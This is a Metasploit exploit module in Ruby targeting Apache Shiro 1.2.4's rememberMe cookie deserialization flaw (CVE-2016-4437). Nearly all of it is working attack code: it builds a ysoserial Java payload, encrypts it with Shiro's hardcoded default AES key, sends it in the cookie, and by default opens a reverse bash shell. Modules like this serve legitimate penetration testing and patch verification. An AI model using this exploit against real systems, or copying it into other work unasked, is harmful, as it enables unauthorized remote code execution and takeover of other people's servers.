##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Powershell

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Apache Shiro v1.2.4 Cookie RememberME Deserial RCE',
      'Description'    => %q{
        This vulnerability allows remote attackers to execute arbitrary code on vulnerable
        installations of Apache Shiro v1.2.4.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
            'L / l-codes[at]qq.com'  # Metasploit module
        ],
      'References'     =>
        [
            ['CVE', '2016-4437'],
            ['URL', 'https://github.com/Medicean/VulApps/tree/master/s/shiro/1']
        ],
      'Platform'       => %w{ win unix },
      'Arch'           => [ ARCH_CMD ],
      'Targets'        =>
        [
          [
            'Unix Command payload',
            'Arch' => ARCH_CMD,
            'Platform' => 'unix',
            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_bash'}
          ],
          [
            'Windows Command payload',
            'Arch' => ARCH_CMD,
            'Platform' => 'win'
          ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 7 2016',
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'WfsDelay'   => 5
        }
      )
    )
    register_options(
    [
      OptString.new('TARGETURI', [ true, 'Base directory path', '/'])
    ])
  end

  def aes_encrypt(payload)
    aes = OpenSSL::Cipher.new('aes-128-cbc')
    aes.encrypt
    aes.key = Rex::Text.decode_base64('kPH+bIxk5D2deZiIxcaaaA==')
    aes.random_iv + aes.update(payload) + aes.final
  end

  def exploit
    cmd = payload.encoded
    vprint_status("Execute CMD: #{cmd}")
    type = ( target.name == 'Unix Command payload' ? 'bash' : 'cmd' )
    java_payload = ::Msf::Util::JavaDeserialization.ysoserial_payload('CommonsCollections2', cmd, modified_type: type)
    ciphertext = aes_encrypt(java_payload)
    base64_ciphertext = Rex::Text.encode_base64(ciphertext)

    send_request_cgi({
      'uri'      => target_uri.path,
      'method'   => 'GET',
      'cookie'   => "rememberMe=#{base64_ciphertext}"
    })
  end

end
